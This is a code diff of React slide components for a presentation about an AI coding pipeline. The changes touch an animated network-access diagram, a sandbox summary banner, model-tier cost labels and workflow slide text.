-              <path d={a} pathLength="1" className="pz-draw-in" fill="none" stroke={colour} strokeWidth="2.5" style={later(1300 + i * 200)} />
+              <path d={`M810 ${y} L870 ${y}`} pathLength="1" className="pz-draw-in" fill="none" stroke={colour} strokeWidth="2.5" style={later(2400 + i * 180)} />
               {h.ok && (
-                <g className="pz-appear" style={later(2000 + i * 200)}>
-                  <path d={b} pathLength="1" className="pz-flow" fill="none" stroke={colour} strokeWidth="2.5" />
-                  <path d={`M764 ${y - 5} L772 ${y} L764 ${y + 5}`} fill="none" stroke={colour} strokeWidth="2.5" />
+                <g className="pz-appear" style={later(3000 + i * 180)}>
+                  <path d={`M926 ${y} L972 ${y}`} pathLength="1" className="pz-flow" fill="none" stroke={colour} strokeWidth="2.5" />
+                  <path d={`M966 ${y - 5} L974 ${y} L966 ${y + 5}`} fill="none" stroke={colour} strokeWidth="2.5" />
                 </g>
               )}
             </g>
@@ -479,25 +495,18 @@ export function Network() {
       </svg>
 
       {HOSTS.map((h, i) => (
-        <div key={h.host} className={`pz-appear absolute left-[780px] flex h-[46px] w-[660px] items-center gap-3 rounded-xl border px-4 ${h.ok ? 'border-hairline bg-surface' : 'border-rose-400/30 bg-rose-500/[0.06]'}`} style={{ top: rowY(i) - 23, ...later(1700 + i * 200) }}>
+        <div key={h.host} className={`pz-appear absolute left-[982px] flex h-[46px] w-[458px] items-center gap-3 rounded-xl border px-4 ${h.ok ? 'border-hairline bg-surface' : 'border-rose-400/30 bg-rose-500/[0.06]'}`} style={{ top: rowY(i) - 23, ...later(2700 + i * 180) }}>
           <Tick ok={h.ok} className="size-6 text-[12px]" />
-          <span className={`font-mono text-[16px] ${h.ok ? 'text-ink' : 'text-rose-200'}`}>{h.host}</span>
-          <span className={`ml-auto flex items-center gap-1.5 text-[14px] ${h.key ? 'text-amber-200' : 'text-faint'}`}>{h.key && <span className="pz-pop" style={later(2600 + i * 200)}>🔑</span>}{h.note}</span>
+          <span className={`whitespace-nowrap font-mono text-[16px] ${h.ok ? 'text-ink' : 'text-rose-200'}`}>{h.host}</span>
+          {h.note && <span className={`ml-auto flex items-center gap-1.5 whitespace-nowrap text-[14px] ${h.key ? 'text-amber-200' : 'text-faint'}`}>{h.key && <span>🔑</span>}{h.note}</span>}
         </div>
       ))}
 
-      {/* three modes: a sandbox gets only what its workflow needs */}
-      <div className="absolute inset-x-0 bottom-0 grid grid-cols-3 gap-4">
-        {[
-          ['none', 'verify · screenshots', 'no credential at all'],
-          ['read', 'review · qa', 'models only'],
-          ['push', 'ship · respond', 'models and this repository'],
-        ].map(([mode, who, what], i) => (
-          <div key={mode} className={`${box} pz-appear flex h-[84px] items-center gap-4 px-5`} style={later(3200 + i * 220)}>
-            <span className={`rounded-full border px-3 py-0.5 font-mono text-[16px] ${MODE_TONE[mode]}`}>{mode}</span>
-            <div className="leading-tight"><div className="font-mono text-[15px] text-violet-200">{who}</div><div className="text-[17px] text-muted">{what}</div></div>
-          </div>
+      <div className="pz-appear absolute inset-x-0 bottom-0 flex h-[84px] items-center gap-5 rounded-2xl border border-hairline bg-surface px-6 text-[20px] text-muted" style={later(4800)}>
+        {['fork', 'run its steps', 'deleted when the run ends'].map((l, i) => (
+          <span key={l} className="flex items-center gap-5">{i > 0 && <span className="text-violet-300">→</span>}<b className="font-semibold text-ink">{l}</b></span>
         ))}
+        <span className="ml-auto text-[17px] text-faint">every workflow gets its own, with only the access it needs</span>
       </div>
     </div>
   );
@@ -520,7 +529,7 @@ export function Sizing() {
           <span className="rounded-full border border-amber-400/60 bg-amber-500/20 px-4 py-1 font-mono text-[22px] text-amber-100">Jev</span>
           <span className="text-[18px] leading-tight text-muted">answers with odds, not prose</span>
         </div>
-        <div className="pz-appear mt-5 rounded-xl bg-ground/60 px-4 py-3 text-[20px] text-ink" style={later(400)}>How big a job is ticket #140?</div>
+        <div className="pz-appear mt-5 rounded-xl bg-ground/60 px-4 py-3 text-[20px] text-ink" style={later(400)}>How big is ticket #140?</div>
         <div className="mt-5 space-y-3">
           {[['small', 55, true], ['fast', 31, false], ['full', 14, false]].map(([size, pct, pick], i) => (
             <div key={size} className="pz-appear grid grid-cols-[64px_1fr_56px] items-center gap-3" style={later(900 + i * 150)}>
@@ -552,13 +561,13 @@ export function Sizing() {
   );
 }
 
-// the ladder (factory/lib/models.ts LADDER), prices per million tokens in · out,
+// the ladder (factory/lib/models.ts LADDER), what one measured coding task cost on each model (MEASURED, below),
 // and where Jev started each job on ticket #16 — a small run
 const TIERS = [
-  { name: 'lite', tone: 'border-emerald-400/40', trust: 'spelled-out work', models: [['haiku', '$0.10 · $0.50']], jobs: [] },
-  { name: 'standard', tone: 'border-sky-400/40', trust: 'a contained change', models: [['deepseek', '$0.30 · $1.20'], ['glm', '$0.15 · $0.50']], jobs: [['Implement', 72], ['Fix', 52], ['Audit', 86]] },
-  { name: 'strong', tone: 'border-violet-400/40', trust: 'judgement', models: [['sonnet', '$2 · $10']], jobs: [['Spec', 99], ['Browser audit', 99], ['Skeptic', 98], ['Review lens', 94]] },
-  { name: 'frontier', tone: 'border-fuchsia-400/40', trust: 'ambiguity', models: [['opus', '$4 · $20']], jobs: [] },
+  { name: 'lite', tone: 'border-emerald-400/40', trust: 'spelled-out work', models: [['haiku', '$0.013']], jobs: [] },
+  { name: 'standard', tone: 'border-sky-400/40', trust: 'a contained change', models: [['deepseek', '$0.035'], ['glm', '$0.013']], jobs: [['Implement', 72], ['Fix', 52], ['Audit', 86]] },
+  { name: 'strong', tone: 'border-violet-400/40', trust: 'judgement', models: [['sonnet', '$0.126']], jobs: [['Spec', 99], ['Browser audit', 99], ['Skeptic', 98], ['Review lens', 94]] },
+  { name: 'frontier', tone: 'border-fuchsia-400/40', trust: 'ambiguity', models: [['opus', null]], jobs: [] },
 ];
 
 export function Ladder() {
@@ -573,7 +582,7 @@ export function Ladder() {
             <div className="text-[17px] text-muted">{t.trust}</div>
             <div className="mt-3 space-y-1.5">
               {t.models.map(([m, price]) => (
-                <div key={m} className="flex items-center justify-between gap-2"><Model m={m} /><span className="font-mono text-[13px] text-faint">{price}</span></div>
+                <div key={m} className="flex items-center justify-between gap-2"><Model m={m} />{price && <span className="font-mono text-[15px] text-ink">{price}<span className="text-[12px] text-faint"> a task</span></span>}</div>
               ))}
             </div>
             <div className="mt-4 flex flex-1 flex-col gap-2 border-t border-hairline pt-4">
@@ -593,7 +602,7 @@ export function Ladder() {
       </div>
       <div className="pz-appear flex items-center gap-5 rounded-2xl border border-hairline bg-raised px-6 py-2.5" style={later(2700)}>
         <span className="text-[24px]">⚖️</span>
-        <div className="text-[18px] leading-snug text-muted">A different question from size: <b className="text-ink">one model per job</b>, the cheapest Jev trusts with it. <span className="text-faint">$ per million tokens, in · out · jobs from ticket #16</span></div>
+        <div className="text-[18px] leading-snug text-muted"><b className="text-ink">One model per workflow step</b>, the cheapest Jev trusts with it. <span className="text-faint">Same coding task on each, measured here.</span> <b className="text-ink">A whole ticket: $0.93.</b></div>
       </div>
     </div>
   );
@@ -609,7 +618,7 @@ export function Climb() {
   return (
     <div className="grid h-full grid-cols-[1fr_600px] gap-7">
       <div className={`${box} flex flex-col px-6 py-4`}>
-        <Kicker>The same job on four models · all four passed</Kicker>
+        <Kicker>The same task on four models · all four passed</Kicker>
         <div className="mt-3 flex flex-1 flex-col justify-around">
           {MEASURED.map(([m, cost, secs], i) => (
             <div key={m} className="pz-appear grid grid-cols-[210px_1fr_100px_56px] items-center gap-3" style={later(300 + i * 220)}>
@@ -626,7 +635,7 @@ export function Climb() {
       </div>
 
       <div className="flex flex-col gap-3">
-        <Kicker>When cheap is not enough, the job climbs</Kicker>
+        <Kicker>When cheap is not enough, the step climbs</Kicker>
         <div className={`${box} pz-appear flex items-center gap-4 px-6 py-5`} style={later(1900)}>
           <span className="text-[28px]">🛠️</span><span className="text-[23px] text-ink">Implement</span><Model m="deepseek" className="ml-auto" />
         </div>
@@ -661,8 +670,8 @@ export const PLATFORM = [
       },
       {
         kicker: 'The factory floor · seven workflows',
-        title: 'Seven workflows, each with one job',
-        body: 'Plain TypeScript that Vercel makes durable. Ship does the building, so that is the one to follow.',
+        title: 'Seven Vercel Workflows, each with one job',
+        body: 'A Claude workflow lives and dies with one session. Vercel saves every step, so these survive and wait for you.',
       },
     ],
     Scene: MapScene,
